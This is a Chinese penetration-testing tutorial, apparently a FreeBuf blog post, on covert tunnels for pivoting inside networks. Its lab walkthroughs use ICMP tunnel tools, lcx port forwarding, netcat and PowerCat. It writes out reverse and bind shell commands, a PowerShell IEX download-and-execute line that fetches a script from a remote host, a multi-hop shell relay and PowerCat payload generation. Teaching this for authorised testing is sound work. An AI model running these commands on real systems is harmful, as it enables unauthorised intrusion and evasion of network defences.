![](https://image.3001.net/images/20200702/1593688766.png!small)

### 系列文章：

> [内网渗透测试：隐藏通讯隧道技术（下）](../articles/network/242445.html)

## 什么是隧道？

在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。

常用的隧道技术有以下三种：

  * 网络层：IPv6 隧道、ICMP 隧道

  * 传输层：TCP 隧道、UDP 隧道、常规端口转发

  * 应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道

## 先判断内网连通性

判断内网的连通性是指判断机器能否上外网等。（综合判断各种协议）各协议的方法如下：

1\. TCP 协议

用“瑞士jundao”——netcat

执行 nc 命令：`nc <IP> <端口>`。

2\. HTTP 协议

用“curl”工具，执行`curl <IP地址:端口>`命令。如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息。

3\. CIMP 协议

用“ping”命令，执行`ping <IP地址/域名>`。

4\. DNS 协议

检测DNS连通性常用的命令是“nslookup”和“dig”。

nslookup 是windows自带的DNS探测命令，执行：

    
    
     nslookup www.baidu.com vps-ip  
     nslookup www.baidu.com     // 不指定服务器，则使用默认的DNS服务器

dig是linux系统自带的DNS探测命令，执行：

    
    
     dig @vps-ip www.baidu.com  
     dig www.baidu.com          // 不指定服务器，则使用默认的DNS服务器

## 网络层隧道技术

### IPv6 隧道

IPv6 隧道技术是指通过 IPv4 隧道传送IPv6 数据包文的技术。为了在 IPv4 海洋中传递 IPv6 信息，可以将 IPv4 作为隧道载体，将
IPv6 报文整体封装在 IPv4 数据报文中，使用 IPv6 报文能够穿过 IPv4 海洋，到达另一个IPv6 小岛。

将
IPv6封装在IPv4中的过程与其他协议封装相似：隧道一端的节点把IPv6数据报作为要发送给隧道另一端节点的IPv4包中的净荷数据，这样就产生了包含IPv6数据报的IPv4数据报流。如果节点A和节点B都是只支持IPv6的节点，节点A要向B发送包，A只是简单地把IPv6头的目的地址设为B的IPv6地址，然后传递给路由器X；X对IPv6包用IPv4进行封装，然后将IPv4头的目的地址设为路由器Y的IPv4地址；若路由器Y收到此IPv4包，则首先拆包，如果发现被封装的IPv6包是发给节点B的，Y就将此包正确地转发给B。

因为现阶段的边界设备、防火墙甚至入侵防御系统 还无法识别 IPv6 的通信数据，而大多数的操作系统支持 IPv6 ，所以需要进行人工配置。

![](https://image.3001.net/images/20200702/1593688815.png!small)

攻击者有时会通过恶意软件来配置允许进行 IPv6 通信的设备，以避开防火墙和入侵检测系统。

配置隧道和自动隧道

配置隧道和自动隧道的主要区别在于：只有执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点建立IP地址时，自动隧道方法无需进行配置；而配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或其他IPv4的配置机制。

支持 IPv6 的隧道工具有 socat、6tunnel、nt6tunnel 等。

### ICMP 隧道

在 ICMP 通信协议中，通信双方的两台设备不需要开放端口即可进行，而在一般的通信协议中，是必须要开放端口的。最常见的 ICMP 协议的消息为 ping
命令的回复，攻击者可以利用命令行得到比回复更多的 ICMP 请求。

在一些网络环境中，如果攻击者使用各类上层隧道（例如HTTP隧道、DNS隧道、常规端口转发等）进行的操作都失败了，由于防火墙不会屏蔽ping数据包，所以常常会通过ping命令访问远程主机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙，实现不受限制的网络访问。

一下介绍常用的ICMP隧道工具。

#### icmpsh

icmpsh 工具是一个简单的ICMP反弹shell工具。可以跨平台，且运行时无需管理员权限。

下载地址：<https://github.com/inquisb/icmpsh>

![](https://image.3001.net/images/20200702/1593688876.png!small)

运行需要安装Python的impacket类库，以便对tcp、udp、icmp、igmp、arp、ipv4、ipv6、smb、等进行访问。

icmpsh 运行时因为要代替系统本身的ping命令的应答程序，所以需要先执行以下命令关闭本地系统的ICMP应答，否则获得的shell不稳定：

    
    
     sysctl -w net.ipv4.icmp_echo_ignore_all=1    // 恢复设为0

![](https://image.3001.net/images/20200702/1593688919.png!small)

实战：

攻击者vps模拟公网IP：192.168.1.101

受害者模拟公网IP：192.168.1.100

攻击者server端在项目目录下输入：

    
    
     python icmpsh_m.py 192.168.1.101 192.168.1.100   
     python icmpsh_m.py 攻击者ip 受害者ip

或输入`./run.sh`运行程序，之后提醒你输入受害者公网ip，会给出你在受害者主机上执行的命令。

给受害者主机上传icmpsh.exe并执行命令：

    
    
     icmpsh.exe -t 192.168.1.101 -d 500 -b 30 -s 128

即可在攻击机上看到受害者的shell：

![](https://image.3001.net/images/20200702/1593688949.png!small)

imcpsh.exe参数：

    
    
     -t  host主机ip地址，用于向其发送ping请求。 此选项是强制性的！  
     -r  发送包含字符串的单个测试icmp请求，然后退出。这是用于测试连接的。  
     -d  毫秒请求之间的延迟（以毫秒为单位）  
     -o  毫秒响应超时（以毫秒为单位）。 如果未及时收到回复，  
                         从站将增加一个空白计数器。 如果该计数器达到极限，则从站将退出。  
                         如果收到响应，则计数器设置回0。  
     -b  空格数限制（退出前未答复的icmp请求  
     -s  字节最大数据缓冲区大小（以字节为单位）

在实际渗透测试中，我们如何知道受害机的公网ip呢，严格说这个ip应该是server端看到的ip，为了得到这个ip可以从内网终端ping这个vps，在vps中用`tcpdump
icmp`或`tcpdump -i eth0 icmp`命令监听并获取这个ip，然后填写。

![](https://image.3001.net/images/20200702/1593688986.png!small)

#### Pingtunnel

Pingtunnel也是一个常用的ICMP隧道工具，可以跨平台，4.在使用时可以给隧道设置密码，从而防止隧道被滥用。

下载地址：<http://freshmeat.sourceforge.net/projects/ptunnel/>

下面我们做一个测试。测试环境如下：

![](https://image.3001.net/images/20200702/1593689022.png!small)

    
    
     攻击者vps  
         模拟公网IP：192.168.1.101  
     Web服务器  
         模拟公网IP：192.168.1.103  
         内网IP：192.168.52.128  
     数据库服务器  
         内网IP：192.168.52.143

假设我们已经获得了web服务器的权限，继续向内网中渗透，但是攻击者无法访问到位于内网的数据库服务器（192.168.52.143）。web服务器也无法直接访问数据库服务器，但是可以通过ping命令访问数据库服务器。那么我们就可以以web服务器为跳板，建立ICMP隧道对内网继续渗透。

先在受害web服务器上面上传ptunnel程序并执行：

    
    
     ptunnel -x whoami

![](https://image.3001.net/images/20200702/1593689065.png!small)

攻击者vps上面执行：

    
    
     ptunnel -p 192.168.1.103 -lp 1080 -da 192.168.52.143 -dp 3389 -x whoami

![](https://image.3001.net/images/20200702/1593689160.png!small)

上述命令的含义是：在访问攻击者vps（192.168.1.101）的1080端口时，会把数据库服务器（192.168.52.143）的3389端口的数据封装在ICMP隧道里，以Web服务器192.168.1.103为ICMP隧道跳板进行传送。整个过程中Web服务器是一个边界服务器，作为一个跳板进行数据转发。

最后在攻击者vps上面访问其本地1080端口即可与数据库服务器的3389端口建立连接：

![](https://image.3001.net/images/20200702/1593689190.png!small)

ptunnel的参数：

    
    
     -x: 指定ICMP隧道连接的密码  
     -lp: 指定攻击者要监听的本地TCP端口  
     -da: 指定要转发的第三方目标机器的IP地址  
     -dp: 指定要转发的第三方目标的TCP端口  
     -p: 指定ICMP隧道另一端的机器的IP地址

也可以使用ICMP隧道访问数据库服务器192.168.52.143的22端口，建立ssh连接。vps输入以下命令：

    
    
     ptunnel -p 192.168.1.103 -lp 1080 -da 192.168.52.143 -dp 22 -x whoami

即可用以下命令建立与内网数据库服务器的ssh连接：

    
    
     ssh administrator@127.0.0.1 -p 1080

![](https://image.3001.net/images/20200702/1593689234.png!small)

同样可以将内网目标服务器的web服务80端口转发到攻击者本地：

    
    
     ptunnel -p 192.168.1.103 -lp 8000 -da 192.168.52.143 -dp 80 -x whoami

攻击者用浏览器访问vps的8000端口即可。

**icmptunnel**

下载地址：<https://github.com/jamesbarlow/icmptunnel>

icmptunnel是一个将IP流量封装到 ICMP echo请求和回复（ping）包中的隧道工具，是在允许 ping
的网络中进行拓展、绕过防火墙的一种半隐蔽方式。虽然ICMP echo流量在网络边界通常会被过滤，但这种方法仍然可能对从企业内网出连到互联网的技术有一定帮助。

测试环境：

  * 攻击机：192.1.68.1.101
  * 受害机：192.168.1.103

攻击者（服务端）：

    
    
    echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all      #禁用icmp回复
    ./icmptunnel -s                                       #监听
    重新打开一个命令行窗口
    ifconfig tun0 10.0.0.1 netmask 255.255.255.0          #添加tun0网卡，分配隧道地址为10.0.0.1/24

![](https://image.3001.net/images/20200705/1593939893.png!small)受害机（客户端）：

    
    
    echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all      #禁用icmp回复
    ./icmptunnel 192.168.1.101                            #连接服务端
    重新打开一个命令行窗口
    ifconfig tun0 10.0.0.2 netmask 255.255.255.0          #添加tun0网卡，分配隧道地址10.0.0.2/24

![](https://image.3001.net/images/20200705/1593940450.png!small)这样，客户端和服务端已经打通了一条ICMP隧道。服务器端是10.0.0.1，客户端端是10.0.0.2。在服务端上，尝试通过SSH连接到客户端，
**注意，要用隧道的ip地址进行SSH连接** ：

![](https://image.3001.net/images/20200705/1593940655.png!small)客户端向外连接到服务端：

![](https://image.3001.net/images/20200705/1593940750.png!small)

## 传输层隧道技术

在渗透测试中，如果内网的防火墙阻止了对指定端口的访问，在获取了目标机器的权限后，可以使用防火墙命令打开指定的端口或关闭防火墙。如果内网中存在一系列防御系统，TCP、UDP
流量会被大量拦截。

### lcx端口转发

lcx是一个很经典的端口转发工具，其基于Socket套接字，有Windows和Linux两个版本。Windows的为lcx.exe，Linux的为portmap。

下载地址：<https://github.com/MrAnonymous-1/lcx>

一个正常的socket套接字必须具备两端：一端是服务器，监听一个端口，等待客户端连接；另一端为客户端，通过给出服务器的IP和端口，与服务端建立连接。

内网端口转发

在受害机（Windows）上面执行如下命令，将受害机3389端口的数据转发到攻击者公网VPS（Windows）的8000端口上。

    
    
     lcx.exe -slave <攻击者ip> 8000 127.0.0.1 3389

![](https://image.3001.net/images/20200702/1593689258.png!small)

在攻击机上面执行如下命令，将本机8000端口上监听到的数据转发到本机的4444端口上面

    
    
     lcx.exe -listen 8000 4444

![](https://image.3001.net/images/20200702/1593689283.png!small)

此时即可登录用远程桌面登录`<攻击者本地ip>:4444`，即可访问受害者的3389端口远程桌面了。

![](https://image.3001.net/images/20200702/1593689305.png!small)

Linux系统上面使用portmap：

先在具有公网ip的攻击机上执行：

    
    
     ./portmap -m 2 -p1 23 -h2 127.0.0.1 -p2 2333  
     ​  
     ./portmap -m 2 -p1 23 -h2 公网主机ip -p2 2333

![](https://image.3001.net/images/20200702/1593689325.png!small)

意思是监听来自23端口的请求，将其转发到2333端口

![](https://image.3001.net/images/20200702/1593689349.png!small)

这里有一个-m参数这个参数的解释：以哪种方式来用这个工具，然后下面有三个方式

1.监听 port1 端口并且连接host2的port2端口 2.监听port1和port2端口。 3.连接host1对应的端口和主机2对应的端口

受害机：

    
    
    ./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 39.1xx.xxx.2xx -p2 23
    
    ./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 23

意思就是将内网受害主机22端口的流量转发到公网攻击机的23端口。

![](https://image.3001.net/images/20200702/1593689387.png!small)

接着攻击者用ssh命令本地连接即可：

![](https://image.3001.net/images/20200702/1593689408.png!small)

本地端口转发

如果目标服务器由于防火墙的限制，部分端口（例如3389、22）的数据无法通过防火墙，我们可以将目标服务器相应端口的数据转发到他的其他防火墙允许的端口上去。在受害机上面执行以下命令，就可以将目标3389端口透传到目标机1080端口上：

    
    
    lcx.exe -tran 1080 127.0.0.1 3389

![](https://image.3001.net/images/20200702/1593689433.png!small)

### netcat——瑞士jundao

下载地址：<https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download>

利用nc获取shell

（1）正向shell

受害机：

    
    
    nc -ldp 4444 -e /bin/sh      //linux
    nc -ldp 4444 -e c:\windows\system32\cmd.exe       //windows

攻击机：

    
    
    nc 192.168.1.102(受害者) 4444     //主动连接

（2）反向shell

攻击者：

    
    
    nc -lvp 4444     //开启监听

受害者：

    
    
    nc 192.168.1.5 4444 -e /bin/sh      //linux 
    nc 192.168.1.5 4444 -e c:\windows\system32\cmd.exe       //windows

反向shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。

内网代理

测试环境如下：

![](https://image.3001.net/images/20200702/1593689455.png!small)

    
    
    攻击者vps
    	模拟公网IP：192.168.1.101
    Web服务器
    	模拟公网IP：192.168.1.103
    	内网IP：192.168.52.128
    数据库服务器
    	内网IP：192.168.52.143

我们已经获取了web服务器的权限，攻击者vps无法访问数据库服务器（192.168.52.143），但是通过web服务器可以访问数据库服务器。我们可以尝试利用web服务器做跳板来获取数据库服务器的shell。

攻击者先在vps上面监听2333端口：

    
    
    nc -lvp 2333

接着想办法在数据库服务器上面执行以下命令

    
    
    nc -ldp 3333 -e c:\windows\system32\cmd.exe

最后在web服务器上面执行以下命令：

    
    
    nc 192.168.1.101 2333 -c "nc -v 192.168.52.143 3333"

最后在攻击机上面获得了数据库服务器的shell

![](https://image.3001.net/images/20200702/1593689476.png!small)

整个过程就是：先使web服务器连上攻击机，在连接上的一瞬间再去连接位于内网的数据库服务器，web服务器是边界服务器，只当做通信的中转。

#### PowerCat

PowerCat就是powershell版本的nc，与nc使用方法相似，且可以上传到目标机本地执行，也可以让目标机远程下载后在内存中执行。

下载地址：<https://github.com/besimorhino/powercat>

将PowerCat作为跳板：

测试环境如下：

![](https://image.3001.net/images/20200702/1593689508.png!small)

    
    
    攻击者vps
    	模拟公网IP：192.168.1.101
    Windows 7
    	模拟公网IP：192.168.1.102
    	内网IP：192.168.52.143
    Windows Server 8
    	内网IP：192.168.52.138

Windows 7 可以与内网 Windows Server 8 通信，Windows 7可连通外网，攻击机无法访问内网的 Windows Server 8
但可以访问Windows 7。假设我们通过渗透已经拿到了Windows 7的权限，我们可以将Windows 7作为跳板拿到内网 Windows Server
8 的shell。

先想办法在 Windows Server 8上面上传powercat.ps1并执行以下powershell命令

    
    
    powershell -ExcutionPolicy bypass -Command "&{Import-Module C:\powercat.ps1;powercat -l -v -p 9999 -e c:\windows\system32\cmd.exe}"

接着在Windows 7 上面执行以下命令：

    
    
    powershell -ExcutionPolicy bypass IEX(New-Object Net.WebClient).DownloadString("http://39.1xx.xx9.xxx/powercat.ps1");powercat -l -v -p 8000 -r tcp:192.168.52.138:9999
    
    // -r:数据转发

最后在攻击者主机上面主动连接Windows 7

    
    
    nc -vv 192.168.1.102 8000

即可在攻击者主机上获得Windows Server 8的shell：

![](https://image.3001.net/images/20200702/1593689527.png!small)

这里的操作是正向shell会受到防火墙的限制而不成功，可以使用命令关闭受害机的防火墙。

反弹shell：

攻击机

    
    
    nc -l -p 8888 -vv

受害机

    
    
    powercat -c <攻击者IP> -p <攻击者端口> -e C:\windows\system32\cmd.exe

反弹PowerShell：

想要反弹powershell的话，两端必须都用powercat。

攻击机

    
    
    powercat -l -v -p 4444 

受害机

    
    
    powercat -c <攻击者IP> -p <攻击者端口> -v -ep
    
    // -ep: 用于反弹powershell

用PowerCat生成payload

    
    
    正向：
    powercat -l -p 4444 -e c:\windows\system32\cmd.exe -v -g >> shell.ps1
    
    反向：
    powercat -c <攻击者IP> <攻击者端口> -v -e c:\windows\system32\cmd.exe -g >> shell.ps1

在攻击者主机上提前做好相应的配置后，将shell.ps1上传至受害主机用powershell执行即可。

  * -g：生成payload

  * -ge：生成经过编码的payload，可以使用`powershell -e/-EncodedCommand <编码的代码>`命令来执行

本人尚为正在入门的小白一枚，文中若有不当之处，还请各位大佬多多指点，小生还需多向大佬们学习！嘻嘻嘻！！！

我的博客：<https://whoamianony.top/>

![](https://image.3001.net/images/20200710/1594315648.jpg!small)

> 参考：
>
>
> [https://www.freebuf.com/articles/web/170970.html](../articles/web/170970.html)
>
> <https://blog.csdn.net/LTtiandd/article/details/102903725>
>
> [https://www.freebuf.com/sectool/9684.html](../sectool/9684.html)
>
> 《内网安全攻防：渗透测试实战指南》

